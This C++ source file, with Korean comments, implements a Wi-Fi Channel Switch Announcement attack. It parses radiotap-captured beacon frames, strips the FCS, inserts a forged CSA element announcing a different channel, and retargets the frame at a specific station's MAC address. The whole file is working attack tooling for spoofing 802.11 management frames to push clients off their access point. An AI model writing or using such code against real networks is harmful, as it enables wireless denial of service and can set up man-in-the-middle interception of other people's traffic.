#include "csa_attack.h"
#include <cstddef>
#include <cstdint>
#include <vector>
#include <cstdio>

namespace CSAAttack {

bool removeFCS(std::vector<uint8_t>& packet) {
    if (packet.size() < 4) return false;

    uint16_t rtapLen = packet[2] | (packet[3] << 8);
    if (rtapLen > packet.size()) {
        return false;
    }

    if (packet.size() < 8) {
        return false;
    }
    uint32_t presentFlags = packet[4] | (packet[5] << 8) | (packet[6] << 16) | (packet[7] << 24);
    bool flagsPresent = (presentFlags & 0x02) != 0;
    if (!flagsPresent) {
        return false;
    }

    std::size_t offset = 8;
    // TSFT 필드가 존재하면 (bit 0) 8바이트 정렬 고려 후 8바이트 증가
    if (presentFlags & 0x01) {
        offset = (offset + 7) & ~((std::size_t)7);
        offset += 8;
    }
    // Flags 필드가 존재하면 현재 offset에 위치함
    if (presentFlags & 0x02) {
        if (offset >= packet.size()) return false;
        uint8_t flags = packet[offset];
        if (flags & 0x10) {  // FCS 플래그(bit4)가 1이면
            // 패킷의 마지막 4바이트(FCS)를 제거
            packet.resize(packet.size() - 4);
            // radiotap Flags 필드의 FCS 플래그를 0으로 클리어
            flags &= ~0x10;
            packet[offset] = flags;
            return true;
        }
    }
    return false;
}

void insertCSA(std::vector<uint8_t>& packet, uint8_t newChannel, uint8_t switchCount) {
    if (packet.size() < 4) return;
    uint16_t rtapLen = packet[2] | (packet[3] << 8);
    if (rtapLen > packet.size()) return;

    std::size_t headerLen = 24;
    std::size_t fixedParamsLen = 12;
    if (packet.size() < rtapLen + headerLen + fixedParamsLen) return;

    std::size_t ieStart = rtapLen + headerLen + fixedParamsLen;
    std::size_t pos = ieStart;
    // IE들을 순회하면서 태그 번호가 정렬된 순서대로 삽입 위치 결정
    while (pos + 2 <= packet.size()) {
        uint8_t id = packet[pos];
        uint8_t len = packet[pos + 1];
        // Extended Supported Rates (0x32)는 순서 비교에서 제외함
        if (id == 0x32) {
            pos += 2 + len;
            continue;
        }
        if (id > 0x25) {
            break;
        }
        pos += 2 + len;
    }

    // CSA IE 구성 (총 5바이트)
    uint8_t csa_ie[5];
    csa_ie[0] = 0x25;       // Tag Number: 0x25 (37)
    csa_ie[1] = 0x03;       // Tag Length: 3
    csa_ie[2] = 0x01;       // Channel Switch Mode: 1
    csa_ie[3] = newChannel; // 새 채널 번호 (계산된 값)
    csa_ie[4] = switchCount; // Channel Switch Count

    // 결정된 위치에 CSA IE 삽입
    if (pos > packet.size()) {
        pos = packet.size();
    }
    packet.insert(packet.begin() + pos, csa_ie, csa_ie + 5);
}

void setUnicastDestination(std::vector<uint8_t>& packet, const uint8_t stationMac[6]) {
    if (packet.size() < 4) return;
    uint16_t rtapLen = packet[2] | (packet[3] << 8);
    if (((std::size_t)rtapLen + 10) <= packet.size()) {
        std::size_t addr1_offset = rtapLen + 4;
        for (int i = 0; i < 6; ++i) {
            packet[addr1_offset + i] = stationMac[i];
        }
    }
}

static uint8_t getCurrentChannel(const std::vector<uint8_t>& packet) {
    if (packet.size() < 4) return 0;
    uint16_t rtapLen = packet[2] | (packet[3] << 8);
    std::size_t offset = rtapLen + 24 + 12;  // IE 시작 위치
    while (offset + 2 <= packet.size()) {
        uint8_t id = packet[offset];
        uint8_t len = packet[offset + 1];
        if (offset + 2 + len > packet.size()) break;
        if (id == 3 && len >= 1) {
            return packet[offset + 2];
        }
        offset += 2 + len;
    }
    return 0;
}

// 현재 채널 값에 따라 새 채널 번호를 계산
static uint8_t computeNewChannel(uint8_t current) {
    if (current == 1 || current == 6) return 11;
    if (current == 11) return 1;
    uint8_t newChannel = (current + 6) % 11;
    if (newChannel == 0) newChannel = 11;
    return newChannel;
}

uint8_t getNewChannelFromBeacon(const std::vector<uint8_t>& packet) {
    uint8_t current = getCurrentChannel(packet);
    if (current == 0){
        printf("현재 채널 정보를 찾지 못했습니다. 기본값 11 사용\n");
        return 0x0B;
    }
    return computeNewChannel(current);
}

} // namespace CSAAttack
